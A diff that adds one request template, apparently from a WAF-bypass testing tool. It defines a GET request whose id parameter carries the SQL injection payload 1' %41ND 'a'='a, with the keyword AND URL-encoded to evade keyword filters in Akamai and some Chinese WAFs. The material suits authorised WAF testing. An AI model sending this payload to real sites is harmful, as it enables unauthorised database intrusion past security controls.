@@ -1,0 +1,13 @@
+# @name: 关键字URL编码(%41ND)
+# @tags: get,sqli,urlencode,keyword,akamai,id,bypass
+# @color: amber
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: keyword_url_encode
+# @intent.param: id
+# @intent.payload: id=1'+%41ND+'a'='a
+# @note: 对关键字字符做 URL 编码(%41=A)，绕过未做二次 URL 解码的关键字匹配（Akamai、部分国产 WAF）。payload: id=1' and 'a'='a
+GET /?id=1'+%41ND+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
